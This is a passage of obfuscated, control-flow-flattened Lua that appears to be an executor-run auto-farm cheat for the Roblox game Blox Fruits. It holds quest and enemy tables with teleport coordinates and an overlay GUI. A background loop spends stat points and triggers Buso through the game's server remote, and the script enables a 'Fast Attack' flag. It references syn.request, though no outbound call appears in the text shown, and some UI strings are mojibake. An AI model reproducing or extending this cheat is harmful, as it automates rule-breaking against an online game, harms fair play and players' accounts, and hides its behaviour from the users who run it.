                ), [3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469), }

              bomayyeuvietnamKaitunRunning = 240
            elseif bomayyeuvietnamKaitunRunning <= 42 then
              val23[frame] = cframe[dutDit](77.92, 24.8, -12247.26)
              val23["Chocolate Bar Battler"] = CFrame.new(717.46, 24.8, -12637.87)
              val23["Sweet Thief"] = CFrame.new(-140.26, 24.71, -12652.31)

              cframe = CFrame.new(56.08, 24.86, -12953)
              bomayyeuvietnamKaitunRunning = 73
              frame = "Candy Rebel"
            else
              cframe[fromRGB2] = fontWeight(cframe3, val42, val43, val44)
              cframe.Size = UDim2.new(1, -47, 1, -47)
              cframe.Selectable = false

              dutDit.CornerRadius = UDim.new(0, 5)
              dutDit.Parent = cframe

              fromRGB2 = Color3.fromRGB
              bomayyeuvietnamKaitunRunning = 94
              dutDit = "Color"
              fontWeight = 135
              cframe3 = 206
              val42 = 250
            end
          elseif bomayyeuvietnamKaitunRunning <= 44 then
            cframe = {}

            dutDit = {
              Min = 1500, Max = 1524, Ms = "Pirate Millionaire", Mon = "Pirate Millionaire", Quest = "PiratePortQuest", QLv = 1, Next = 1525, }

            divider = CFrame.new
            bomayyeuvietnamKaitunRunning = 62
            new = "CQ"
            divider2 = -290.074677
            typeAccountScroll = 42.9034653
            itemLabel1 = 5581.58984
            new2 = 0.965929627
            itemLabel12 = 0
          elseif bomayyeuvietnamKaitunRunning <= 45 then
            cframe[dutDit] = 3

            val33[frame] = cframe

            val33["Dragon Talon"] = {
              Names = { "Uzoth" }, Position = CFrame.new(5662.28857, 1206.85913, 870.284912), Command = { "BuyDragonTalon" }, MinSea = 3, }

            cframe = {}
            bomayyeuvietnamKaitunRunning = 155
            frame = "Godhuman"
            dutDit = "Names"
          else
            new5[fromRGB] = "Living Zombie"
            new5.Mon = "Living Zombie"
            new5.Quest = "HauntedQuest1"
            new5.QLv = 2
            new5.Next = 2025
            new5.Fallback = "Reborn Skeleton"
            new5.CQ = CFrame.new(-9480.827148, 142.130661, 5566.071289)

            new6 = CFrame.new
            bomayyeuvietnamKaitunRunning = 47
            fromRGB = "CMon"
            cframe2 = -10125.234375
            top = 183.947052
          end
        elseif bomayyeuvietnamKaitunRunning <= 69 then
          if bomayyeuvietnamKaitunRunning <= 57 then
            if bomayyeuvietnamKaitunRunning <= 51 then
              if bomayyeuvietnamKaitunRunning <= 48 then
                if bomayyeuvietnamKaitunRunning <= 47 then
                  new5[fromRGB] = new6(cframe2, top, 6242.013671)

                  fromRGB = {
                    Min = 2025, Max = 2049, Ms = "Demonic Soul", Mon = "Demonic", Quest = "HauntedQuest2", QLv = 1, Next = 2050, Fallback = "Living Zombie", }

                  cframe2 = CFrame.new
                  bomayyeuvietnamKaitunRunning = 10
                  new6 = "CQ"
                else
                  divider2[typeAccountScroll] = itemLabel1(
                    new2, itemLabel12, textLabel, levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2
                  )

                  divider2.CMon = CFrame.new(6488.915527, 383.383758, -110.66246)

                  typeAccountScroll = {
                    Min = 1625, Max = 1649, Ms = "Female Islander", Mon = "Female Islander", Quest = "AmazonQuest2", QLv = 1, }

                  bomayyeuvietnamKaitunRunning = 90
                  itemLabel1 = "Next"
                  new2 = 1650
                end
              elseif bomayyeuvietnamKaitunRunning <= 49 then
                itemLabel12[textLabel] = levelLabel
                itemLabel12.Mon = "Vampire"
                itemLabel12.Quest = "ZombieQuest"
                itemLabel12.QLv = 2
                itemLabel12.Next = 1000
                itemLabel12.Fallback = "Zombie"

                levelLabel = CFrame.new
                bomayyeuvietnamKaitunRunning = 325
                textLabel = "CQ"
                new3 = -5497.06152
                dropShadow2 = 47.5923004
                main = -795.237061
                new4 = -0.29242146
                new5 = 0
                fromRGB = -0.95628953
                new6 = 0
                cframe2 = 1
                top = 0
                udim2 = 0.95628953
                textLabel2 = 0
                udim22 = -0.29242146
              elseif bomayyeuvietnamKaitunRunning <= 50 then
                itemLabel1[new2] = itemLabel12(
                  textLabel, levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2, top, -0.342042685
                )

                itemLabel1.CMon = CFrame.new(
                  1376.86401, 97.2779999, -1396.93115, -0.986755967, 7.71178321e-8, -0.162211925, 7.71531674e-8, 1, 6.08143536e-9, 0.162211925, -6.51427134e-9, -0.986755967
                )

                new2 = { Min = 120, Max = 174, Ms = "Chief Petty Officer" }
                bomayyeuvietnamKaitunRunning = 219
                itemLabel12 = "Mon"
              else
                textLabel2 = textLabel2[udim22]("TextLabel")
                udim22 = Instance.new("UIGradient")
                under = Instance.new("TextLabel")
                uiGradient = Instance.new("UIGradient")
                new7 = Instance.new("ImageLabel")
                coinCard.Name = "CoinCard"
                fontWeight = coreGui
                bomayyeuvietnamKaitunRunning = 86
                fromRGB2 = "Parent"
              end
            elseif bomayyeuvietnamKaitunRunning <= 54 then
              if bomayyeuvietnamKaitunRunning <= 52 then
                dropShadow2[main] = new4.new(
                  -6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578
                )

                new4 = CFrame.new
                bomayyeuvietnamKaitunRunning = 21
                main = "CMon"
                new5 = -6401.27979
                fromRGB = 15.9775667
                new6 = -5948.24316
                cframe2 = 0.388303697
                top = 0
                udim2 = -0.921531856
                textLabel2 = 0
                udim22 = 1
                under = 0
                uiGradient = 0.921531856
                new7 = 0
                fromRGB2 = 0.388303697
              elseif bomayyeuvietnamKaitunRunning <= 53 then
                itemLabel12.Name = "Fishman Karate"
                itemLabel12.Target = 400
                itemLabel12.MinSea = 3

                textLabel = { Name = "Sharkman Karate", BuyOnly = true }
                levelLabel = { Name = "Electro", Target = 400, MinSea = 3 }
                new3 = { Name = "Electric Claw" }
                bomayyeuvietnamKaitunRunning = 368
                dropShadow2 = "BuyOnly"
              else
                local create2 = val28:Create(dutDit, tweenInfo, { BackgroundTransparency = 0 })

                divider.MouseButton1Down:Connect(function()
                  local val82 = 1

                  while true do
                    if val82 <= 3 then
                      if val82 <= 1 then
                        if val82 <= 0 then
                          create2:Play()
                          val82 = 5
                        else
                          val82 = val29 and 4 or 2
                        end
                      elseif val82 <= 2 then
                        val28:Create(nil, tweenInfo, { Size = size }):Play()
                        val82 = 3
                      else
                        val29 = not val29
                        val82 = val30 and 0 or 6
                      end

                      continue
                    end

                    if val82 <= 5 then
                      if val82 <= 4 then
                        val28:Create(nil, tweenInfo, { Size = udim }):Play()
                        val82 = 3
                      else
                        val30 = not val30
                        coinCard.Enabled = not coinCard.Enabled
                        val28:Create(cameraBlur, tweenInfo, { Size = coinCard.Enabled and 8 or 0 }):Play()
                        val82 = 7
                      end

                      continue
                    end

                    if val82 <= 6 then
                      create:Play()
                      val82 = 5
                      continue
                    end

                    break
                  end
                end)

                local val83 = placeId == 2753915549

                if val83 then
                  bomayyeuvietnamKaitunRunning = 110
                  frame = val83
                else
                  bomayyeuvietnamKaitunRunning = 172
                end
              end
            elseif bomayyeuvietnamKaitunRunning <= 55 then
              cframe.MinSea = 1
              cframe.BeliCost = 750000

              val33[frame] = cframe
              cframe = { Names = { "Sabi" } }
              new = {}
              divider2 = CFrame.new
              bomayyeuvietnamKaitunRunning = 242
              frame = "Dragon Claw"
              dutDit = "PositionsBySea"
              divider = 2
              typeAccountScroll = 699.028992
              itemLabel1 = 185.660995
              new2 = 654.89502
              itemLabel12 = -0.971684337
              textLabel = 0
              levelLabel = -0.236283794
              new3 = 0
              dropShadow2 = 1
              main = 0
              new4 = 0.236283794
              new5 = 0
              fromRGB = -0.971684337
            elseif bomayyeuvietnamKaitunRunning <= 56 then
              new[divider] = divider2(
                typeAccountScroll, 33.929848, -4767.102539, -0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, -0.453972578
              )

              new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

              cframe[dutDit] = new
              cframe.Command = { "BuyElectro" }
              cframe.MinSea = 1

              bomayyeuvietnamKaitunRunning = 259
              dutDit = "BeliCost"
            else
              bomayyeuvietnamKaitunRunning = getgenv().BOMAYYEUVIETNAMKaitunRunning and 136
                or 157
            end
          elseif bomayyeuvietnamKaitunRunning <= 63 then
            if bomayyeuvietnamKaitunRunning <= 60 then
              if bomayyeuvietnamKaitunRunning <= 58 then
                new6[dutDit] = new.fromRGB(255, 255, 255)
                new6.TextSize = 16
                new6.TextXAlignment = Enum.TextXAlignment.Left
                new6.TextYAlignment = Enum.TextYAlignment.Bottom

                cframe2.BackgroundTransparency = 1
                cframe2.Parent = cframe

                new = UDim2
                bomayyeuvietnamKaitunRunning = 207
                dutDit = "Position"
                fromRGB2 = "new"
              elseif bomayyeuvietnamKaitunRunning <= 59 then
                new2[itemLabel12] = textLabel(
                  levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2, 0.95628953, 0, -0.29242146
                )

                new2.CMon = CFrame.new(
                  -5649.23438, 126.0578, -737.773743, 0.355238914, -8.10359282e-8, 0.934775114, 1.65461245e-8, 1, 8.04023372e-8, -0.934775114, -1.3095117e-8, 0.355238914
                )

                itemLabel12 = { Min = 975, Max = 999 }
                bomayyeuvietnamKaitunRunning = 49
                textLabel = "Ms"
                levelLabel = "Vampire"
              else
                typeAccountScroll[divider] = divider2
                typeAccountScroll.BackgroundTransparency = 1

                local uiListLayout = Instance.new("UIListLayout")
                uiListLayout.Parent = typeAccountScroll
                uiListLayout.Padding = UDim.new(0, 5)
                uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder

                for index, value2 in ipairs({ itemLabel1, new2, itemLabel12 }) do
                  value2.LayoutOrder = index
                  value2.Text = string.format("Item slot %02d", index)
                  value2.TextColor3 = val25.Muted

                  cframe2(value2)
                end

                bomayyeuvietnamKaitunRunning = 105
              end
            elseif bomayyeuvietnamKaitunRunning <= 61 then
              new5[dutDit] = new[fromRGB2].Bottom

              fromRGB.BackgroundTransparency = 1
              fromRGB.Parent = cframe
              fromRGB.Position = UDim2.new(0.070000000298023, 0, 0.89999997615814, 0)
              fromRGB.Size = UDim2.new(0, 0, 0, 18)
              fromRGB.Selectable = false

              bomayyeuvietnamKaitunRunning = 89
            elseif bomayyeuvietnamKaitunRunning <= 62 then
              dutDit[new] = divider(
                divider2, typeAccountScroll, itemLabel1, new2, itemLabel12, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627
              )

              dutDit.CMon = CFrame.new(81.164993, 43.755737, 5724.702148)

              new = {
                Min = 1525, Max = 1574, Ms = "Pistol Billionaire", Mon = "Pistol Billionaire", }

              bomayyeuvietnamKaitunRunning = 25
              divider = "Quest"
            else
              textLabel[levelLabel] = new3(
                dropShadow2, main, new4, new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, 0.465965867
              )

              levelLabel = {
                Min = 190, Max = 209, Ms = "Prisoner", Mon = "Prisoner", Quest = "PrisonerQuest", QLv = 1, Next = 210, }

              dropShadow2 = CFrame.new
              bomayyeuvietnamKaitunRunning = 321
              new3 = "CQ"
              main = 5308.93115
              new4 = 1.65517521
              new5 = 475.120514
            end
          elseif bomayyeuvietnamKaitunRunning <= 66 then
            if bomayyeuvietnamKaitunRunning <= 64 then
              if New_World then
                bomayyeuvietnamKaitunRunning = 156
              else
                bomayyeuvietnamKaitunRunning = 338
              end
            elseif bomayyeuvietnamKaitunRunning <= 65 then
              frame = frame.PlayerAdded:Wait()
              bomayyeuvietnamKaitunRunning = 269
            else
              divider[frame] = new.fromRGB(27, 42, 53)
              val28 = tweenService
              val29 = false
              udim = UDim2.new(0, 40, 0, 40)
              frame = UDim2.new
              bomayyeuvietnamKaitunRunning = 72
              new = 0
            end
          elseif bomayyeuvietnamKaitunRunning <= 67 then
            dropShadow2[dutDit] = Enum.TextYAlignment.Bottom

            main.BackgroundTransparency = 1
            main.Parent = cframe
            main.Position = UDim2.new(0.75, 0, 0.89999997615814, 0)
            main.Size = UDim2.new(0, 0, 0, 18)

            bomayyeuvietnamKaitunRunning = 342
            dutDit = "Selectable"
          elseif bomayyeuvietnamKaitunRunning <= 68 then
            new[1] = divider

            cframe[dutDit] = new
            cframe.MinSea = 1
            cframe.BeliCost = 150000

            val33[frame] = cframe
            cframe = { Names = { "Mad Scientist" } }
            new = { CFrame.new(-4631.24, 13.46, -355.36) }
            divider2 = CFrame.new
            bomayyeuvietnamKaitunRunning = 56
            frame = "Electro"
            dutDit = "PositionsBySea"
            divider = 2
            typeAccountScroll = -4866.150391
          else
            uiGradient[new7] = fromRGB2
            uiGradient.CQ = CFrame.new(-1928.31763, 37.7296638, -12840.626)
            uiGradient.CMon = CFrame.new(-1818.3479, 93.412757, -12887.66015)

            new7 = {
              Min = 2300, Max = 2324, Ms = "Cocoa Warrior", Mon = "Cocoa Warrior", }

            bomayyeuvietnamKaitunRunning = 292
          end
        elseif bomayyeuvietnamKaitunRunning <= 81 then
          if bomayyeuvietnamKaitunRunning <= 75 then
            if bomayyeuvietnamKaitunRunning <= 72 then
              if bomayyeuvietnamKaitunRunning <= 70 then
                levelLabel[dutDit] = new

                levelLabel.FontFace = Font.new(
                  "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                )

                levelLabel.Text = "Level: N/A    Third Sea : Ã¢ÂÂŒ"
                levelLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

                bomayyeuvietnamKaitunRunning = 266
                dutDit = "TextSize"
                new = 16
              elseif bomayyeuvietnamKaitunRunning <= 71 then
                new2[dutDit] = UDim2.new(0, 0, 0, 20)
                new2.Size = UDim2.new(1, 0, 0, 18)
                new2.Selectable = false

                new = Font.new
                fontWeight = Enum.FontWeight.Bold
                bomayyeuvietnamKaitunRunning = 8
                dutDit = "FontFace"
                fromRGB2 = "rbxasset://fonts/families/GothamSSm.json"
              else
                size = frame(new, 30, 0, 30)
                tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                val30 = false
                create = val28:Create(dutDit, tweenInfo, { BackgroundTransparency = 0.18 })
                bomayyeuvietnamKaitunRunning = 54
              end
            elseif bomayyeuvietnamKaitunRunning <= 73 then
              val23[frame] = cframe
              val23["Candy Pirate"] = CFrame.new(-1372.53, 32.11, -14506.54)
              val23["Snow Demon"] = CFrame.new(-865.98, 13.21, -14589.03)
              val23["Island Boy"] = CFrame.new(-16736.23, 20.54, -131.72)

              cframe = CFrame.new
              bomayyeuvietnamKaitunRunning = 127
              frame = "Isle Outlaw"
            elseif bomayyeuvietnamKaitunRunning <= 74 then
              divider2[typeAccountScroll] = itemLabel1(
                new2, itemLabel12, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693
              )

              divider2.CMon = CFrame.new(
                1617.07886, 1.5542295, 4295.54932, -0.997540116, -2.26287735e-8, -0.070099175, -1.69377223e-8, 1, -8.17798806e-8, 0.070099175, -8.03913949e-8, -0.997540116
              )

              typeAccountScroll = {}
              bomayyeuvietnamKaitunRunning = 85
              itemLabel1 = "Min"
            else
              top[udim2] = textLabel2(
                udim22, under, uiGradient, new7, fromRGB2, 0.892505825, -1.08168464e-7, 1, -3.22542007e-7, -0.892505825, -2.4201924e-7, -0.451037169
              )

              udim2 = {
                Min = 1375, Max = 1424, Ms = "Snow Lurker", Mon = "Snow Lurker", Quest = "FrostQuest", QLv = 2, Next = 1450, }

              bomayyeuvietnamKaitunRunning = 87
              textLabel2 = "Fallback"
            end
          elseif bomayyeuvietnamKaitunRunning <= 78 then
            if bomayyeuvietnamKaitunRunning <= 76 then
              fromRGB.Quest = "ShipQuest1"
              fromRGB.QLv = 2
              fromRGB.Next = 1300
              fromRGB.Fallback = "Ship Deckhand"

              fromRGB.CQ = CFrame.new(
                1037.80127, 125.092171, 32911.6016, -0.244533166, 0, -0.969640911, 0, 1.00000012, 0, 0.96964103, 0, -0.244533136
              )

              cframe2 = CFrame
              bomayyeuvietnamKaitunRunning = 199
              new6 = "CMon"
            elseif bomayyeuvietnamKaitunRunning <= 77 then
              fromRGB.Parent = dutDit
              fromRGB.Thickness = 1

              dutDit = Instance.new("UIGradient")
              dutDit.Parent = fromRGB

              cframe2 = NumberSequence.new
              udim2 = {}
              udim22 = NumberSequenceKeypoint.new(0, 0)
              uiGradient = NumberSequenceKeypoint.new(0, 0)
              fromRGB2 = NumberSequenceKeypoint
              bomayyeuvietnamKaitunRunning = 16
              fromRGB = "Transparency"
              fontWeight = "new"
            else
              udim2.QLv = 1
              udim2.Next = 2150

              udim2.CQ = CFrame.new(
                -820.404358, 65.8453293, -10965.5654, 0.822534859, 5.24448502e-8, -0.568714678, -2.08336317e-8, 1, 6.20846663e-8, 0.568714678, -3.92184099e-8, 0.822534859
              )

              udim22 = CFrame.new
              bomayyeuvietnamKaitunRunning = 236
              textLabel2 = "CMon"
              under = -821.614075
              uiGradient = 208.39537
              new7 = -10990.7617
              fromRGB2 = -0.870096624
            end
          elseif bomayyeuvietnamKaitunRunning <= 79 then
            task.spawn(function()
              local val84 = 0

              while true do
                if val84 <= 0 then
                  val84 = task.wait(0.5) and 1

                  if val84 then
                    continue
                  end

                  val84 = 2
                  continue
                end

                if val84 <= 1 then
                  val21.p(function()
                    local val85 = 18
                    local val86 = nil

                    while true do
                      if not (val85 <= 9) then
                        if val85 <= 14 then
                          if val85 <= 11 then
                            if val85 <= 10 then
                              val85 = val86 and 12 or 13
                            else
                              val85 = val86 and 16 or 3
                            end
                          elseif val85 <= 12 then
                            val86 = localPlayer.Data.Stats.Defense.Level.Value < val20
                            val85 = 13
                          elseif val85 <= 13 then
                            val85 = val86 and 1 or 8
                          else
                            val86 = localPlayer.Data.Stats.Sword.Level.Value < val20
                            val85 = 17
                          end
                        elseif val85 <= 17 then
                          if val85 <= 15 then
                            val37.Remotes.CommF_:InvokeServer(
                              "AddPoint", "Sword", localPlayer.Data.Points.Value
                            )

                            val85 = 20
                          elseif val85 <= 16 then
                            val86 = localPlayer.Data.Points.Value > 0
                            val85 = 3
                          else
                            val85 = val86 and 15 or 20
                          end
                        elseif val85 <= 18 then
                          local val87 = localPlayer.Data.Points.Value > 0

                          if val87 then
                            val85 = 19
                          else
                            val85 = 5
                            val86 = val87
                          end
                        elseif val85 <= 19 then
                          val86 = localPlayer.Data.Stats.Melee.Level.Value < val20
                          val85 = 5
                        else
                          val85 = not val21.ffc(localPlayer.Character, "HasBuso") and 0 or 6
                        end

                        continue
                      end

                      if val85 <= 4 then
                        if val85 <= 1 then
                          if val85 <= 0 then
                            val37.Remotes.CommF_:InvokeServer("Buso")
                            val85 = 6
                          else
                            val37.Remotes.CommF_:InvokeServer(
                              "AddPoint", "Defense", localPlayer.Data.Points.Value
                            )

                            val85 = 8
                          end
                        elseif val85 <= 2 then
                          val37.Remotes.CommF_:InvokeServer(
                            "AddPoint", "Melee", localPlayer.Data.Points.Value
                          )

                          val85 = 7
                        elseif val85 <= 3 then
                          val85 = val86 and 14 or 17
                        else
                          val86 = localPlayer.Data.Points.Value > 0
                          val85 = 10
                        end

                        continue
                      end

                      if not (val85 <= 6) then
                        if val85 <= 7 then
                          local val88 = localPlayer.Data.Stats.Melee.Level.Value >= val20

                          if val88 then
                            val85 = 4
                          else
                            val85 = 10
                            val86 = val88
                          end
                        elseif val85 <= 8 then
                          local val89 = localPlayer.Data.Stats.Melee.Level.Value >= val20

                          if val89 then
                            val85 = 9
                          else
                            val85 = 11
                            val86 = val89
                          end
                        else
                          val86 = localPlayer.Data.Stats.Defense.Level.Value >= val20
                          val85 = 11
                        end

                        continue
                      end

                      if val85 <= 5 then
                        val85 = val86 and 2 or 7
                        continue
                      end

                      break
                    end
                  end)

                  val84 = 0
                  continue
                end

                break
              end
            end)

            getgenv()["Fast Attack"] = true
            task.spawn(function(...) end)
            frame = GetM("Mirror Fractal")
            bomayyeuvietnamKaitunRunning = 245
            cframe = 0
          elseif bomayyeuvietnamKaitunRunning <= 80 then
            textLabel[dutDit] = new(fromRGB2, fontWeight, cframe3[val42].Normal)
            textLabel.Text = "Beli: N/A"
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            textLabel.TextSize = 16
            textLabel.TextXAlignment = Enum.TextXAlignment.Left

            new = Enum.TextYAlignment
            bomayyeuvietnamKaitunRunning = 5
            dutDit = "TextYAlignment"
            fromRGB2 = "Bottom"
          else
            new4[new5] = fromRGB
            new4.MinSea = 3

            new5 = { Name = "Death Step", Target = 400, MinSea = 3 }
            fromRGB = { Name = "Sharkman Karate", Target = 400, MinSea = 3 }
            new6 = { Name = "Electric Claw", Target = 400 }
            bomayyeuvietnamKaitunRunning = 190
          end
        elseif bomayyeuvietnamKaitunRunning <= 87 then
          if bomayyeuvietnamKaitunRunning <= 84 then
            if bomayyeuvietnamKaitunRunning <= 82 then
              val47[val48] = 2625
              val47.Max = 2649
              val47.Ms = "Coral Pirate"
              val47.Mon = "Coral Pirates"
              val47.Quest = "SubmergedQuest1"
              val47.QLv = 2
              val47.Next = 2650
              val47.Fallback = "Reef Bandit"

              new8 = CFrame.new
              bomayyeuvietnamKaitunRunning = 3
              val48 = "CQ"
              val49 = 10778.875
              new9 = -2087.72437
              val50 = 9265.18359
              val51 = 0.934615612
            elseif bomayyeuvietnamKaitunRunning <= 83 then
              new.Parent = dutDit
              new.AnchorPoint = Vector2.new(0.5, 0.5)
              new.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
              new.BackgroundTransparency = 1
              new.BorderSizePixel = 0

              main = UDim2.new(0.5, 0, 0.0500000007, 0)
              bomayyeuvietnamKaitunRunning = 117
              dropShadow2 = "Position"
            else
              fromRGB2[fontWeight] = 2349
              fromRGB2.Ms = "Chocolate Bar Battler"
              fromRGB2.Mon = "Chocolate Bar Battler"
              fromRGB2.Quest = "ChocQuest1"
              fromRGB2.QLv = 2
              fromRGB2.Next = 2350
              fromRGB2.Fallback = "Cocoa Warrior"
              fromRGB2.CQ = CFrame.new(230.191864, 24.734258, -12202.65722)

              cframe3 = CFrame
              bomayyeuvietnamKaitunRunning = 337
              fontWeight = "CMon"
              val42 = "new"
            end
          elseif bomayyeuvietnamKaitunRunning <= 85 then
            typeAccountScroll[itemLabel1] = 90
            typeAccountScroll.Max = 99
            typeAccountScroll.Ms = "Snow Bandit"
            typeAccountScroll.Mon = "Snow Bandit"
            typeAccountScroll.Quest = "SnowQuest"
            typeAccountScroll.QLv = 1
            typeAccountScroll.Next = 100

            new2 = CFrame.new
            bomayyeuvietnamKaitunRunning = 314
            itemLabel1 = "CQ"
            itemLabel12 = 1389.74451
            textLabel = 86.6520844
            levelLabel = -1298.90796
            new3 = -0.342042685
            dropShadow2 = 0
            main = 0.939684391
            new4 = 0
            new5 = 1
          elseif bomayyeuvietnamKaitunRunning <= 86 then
            coinCard[fromRGB2] = fontWeight
            coinCard.ResetOnSpawn = false
            coinCard.DisplayOrder = 20

            frame.AnchorPoint = Vector2.new(0.5, 0.5)
            frame.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
            frame.BackgroundTransparency = 1

            fontWeight = Color3.fromRGB
            bomayyeuvietnamKaitunRunning = 164
            fromRGB2 = "BorderColor3"
            cframe3 = 27
            val42 = 42
            val43 = 53
          else
            udim2[textLabel2] = "Arctic Warrior"

            udim2.CQ = CFrame.new(
              5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909
            )

            udim22 = CFrame.new
            bomayyeuvietnamKaitunRunning = 268
            textLabel2 = "CMon"
            under = 5513.36865
            uiGradient = 60.546711
            new7 = -6809.94971
            fromRGB2 = -0.958693981
            fontWeight = -1.65617333e-8
            cframe3 = 0.284439981
            val42 = -4.07668654e-9
            val43 = 1
          end
        elseif bomayyeuvietnamKaitunRunning <= 90 then
          if bomayyeuvietnamKaitunRunning <= 88 then
            new4[new5] = Vector2.new(0.5, 0)
            new4.BackgroundColor3 = Color3.fromRGB(163, 162, 165)
            new4.BackgroundTransparency = 1
            new4.Position = UDim2.new(0.5, 0, 0, 10)

            fromRGB = UDim2.new
            bomayyeuvietnamKaitunRunning = 13
            new5 = "Size"
            cframe2 = 0
          elseif bomayyeuvietnamKaitunRunning <= 89 then
            fromRGB.FontFace = Font.new(
              "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
            )

            fromRGB.Text = "Ã°ÂŸÂ”Â´ Skull Guitar"
            fromRGB.TextColor3 = Color3.fromRGB(255, 255, 255)
            fromRGB.TextSize = 16

            bomayyeuvietnamKaitunRunning = 181
          else
            typeAccountScroll[itemLabel1] = new2

            typeAccountScroll.CQ = CFrame.new(
              5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, 0, -1, 0, 0
            )

            typeAccountScroll.CMon = CFrame.new(4770.499023, 758.9552, 1069.868041)

            itemLabel1 = { Min = 1650 }
            bomayyeuvietnamKaitunRunning = 116
          end
        elseif bomayyeuvietnamKaitunRunning <= 91 then
          divider[divider2] = typeAccountScroll

          divider2 = {
            Min = 75, Max = 89, Ms = "Desert Officer", Mon = "Desert Officer", Quest = "DesertQuest", QLv = 2, Next = 90, Fallback = "Desert Bandit", }

          itemLabel1 = CFrame.new
          bomayyeuvietnamKaitunRunning = 74
          typeAccountScroll = "CQ"
          new2 = 894.488647
          itemLabel12 = 5.14000702
        elseif bomayyeuvietnamKaitunRunning <= 92 then
          cframe = syn.request
          bomayyeuvietnamKaitunRunning = 193
        else
          new[divider] = "Area1Quest"
          new.QLv = 2
          new.Next = 775
          new.Fallback = "Raider"

          new.CQ = CFrame.new(
            -429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985
          )

          divider2 = CFrame
          bomayyeuvietnamKaitunRunning = 311
          divider = "CMon"
          typeAccountScroll = "new"
        end

        continue
      elseif bomayyeuvietnamKaitunRunning <= 140 then
        if bomayyeuvietnamKaitunRunning <= 116 then
          if bomayyeuvietnamKaitunRunning <= 104 then
            if bomayyeuvietnamKaitunRunning <= 98 then
              if bomayyeuvietnamKaitunRunning <= 95 then
                if bomayyeuvietnamKaitunRunning <= 94 then
                  new[dutDit] = fromRGB2(fontWeight, cframe3, val42)
                  new.Thickness = 2.5
                  new.Parent = cframe

                  divider.BorderColor3 = Color3.fromRGB(27, 42, 53)
                  divider.Name = "Divider"
                  divider.Parent = cframe
                  divider.Position = UDim2.new(0.15000000596046, 0, 0.15000000596046, 0)

                  bomayyeuvietnamKaitunRunning = 112
                  dutDit = "Size"
                else
                  divider[divider2] = typeAccountScroll[itemLabel1](
                    894.488647, 5.14000702, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693
                  )

                  typeAccountScroll = CFrame.new(
                    932.788818, 6.8503746, 4488.24609, -0.998625934, 3.08948351e-8, 0.0524050146, 2.79967303e-8, 1, -5.60361286e-8, -0.0524050146, -5.44919629e-8, -0.998625934
                  )

                  bomayyeuvietnamKaitunRunning = 91
                  divider2 = "CMon"
                end

                continue
              elseif bomayyeuvietnamKaitunRunning <= 96 then
                val57 = 6
                break
              else
                if bomayyeuvietnamKaitunRunning <= 97 then
                  under[uiGradient] = CFrame.new(-1817.974731, 209.563278, -12288.92285)

                  uiGradient = {
                    Min = 2250, Max = 2299, Ms = "Baking Staff", Mon = "Baking Staff", Quest = "CakeQuest2", QLv = 1, Next = 2300, }

                  bomayyeuvietnamKaitunRunning = 69
                  new7 = "Fallback"
                  fromRGB2 = "Cookie Crafter"
                else
                  cameraBlur = cframe[dutDit]("BlurEffect")
                  cameraBlur.Name = "CameraBlur"
                  cameraBlur.Size = 8
                  cameraBlur.Parent = frame

                  coinCard = Instance.new("ScreenGui")
                  frame = Instance.new("Frame")
                  cframe = Instance.new("Frame")
                  dutDit = Instance.new("UICorner")
                  new = Instance
                  bomayyeuvietnamKaitunRunning = 308
                end

                continue
              end
            else
              if bomayyeuvietnamKaitunRunning <= 101 then
                if bomayyeuvietnamKaitunRunning <= 99 then
                  val48[new8] = val49(
                    new9, val50, val51, val52, val53, val54, val55, val56, 8.00902953e-8, 0.946948707, -4.18033075e-8, -0.321384728
                  )

                  val48.CMon = CFrame.new(
                    10671.2715, -2057.59155, 10047.2588, -0.846484065, -3.11045447e-8, 0.532414079, -5.55383117e-8, 1, -2.98785316e-8, -0.532414079, -5.48610757e-8, -0.846484065
                  )

                  new8 = { Min = 2675, Max = 2699 }
                  bomayyeuvietnamKaitunRunning = 2
                elseif bomayyeuvietnamKaitunRunning <= 100 then
                  divider2[typeAccountScroll] = itemLabel1
                  divider2.Mon = "Dragon Crew Archer"
                  divider2.Quest = "AmazonQuest"
                  divider2.QLv = 2
                  divider2.Next = 1625
                  divider2.Fallback = "Dragon Crew Warrior"

                  itemLabel1 = CFrame.new
                  bomayyeuvietnamKaitunRunning = 48
                  typeAccountScroll = "CQ"
                  new2 = 5832.83594
                  itemLabel12 = 51.6806107
                  textLabel = -1101.51563
                  levelLabel = 0.898790359
                  new3 = 0
                  dropShadow2 = -0.438378751
                  main = 0
                  new4 = 1
                  new5 = 0
                  fromRGB = 0.438378751
                  new6 = 0
                  cframe2 = 0.898790359
                else
                  udim22[under] = uiGradient(
                    new7, fromRGB2, fontWeight, cframe3, val42, val43, val44, val45, val46, -0.996196866, 0, 0.087131381
                  )

                  udim22.CMon = CFrame.new(
                    5569.80518, 38.5269432, 3849.01196, 0.896460414, 3.98027495e-8, 0.443124533, -1.34262139e-8, 1, -6.26611296e-8, -0.443124533, 5.02237434e-8, 0.896460414
                  )

                  under = { Min = 650, Max = 9999 }
                  bomayyeuvietnamKaitunRunning = 14
                  uiGradient = "Ms"
                  new7 = "Galley Captain"
                end
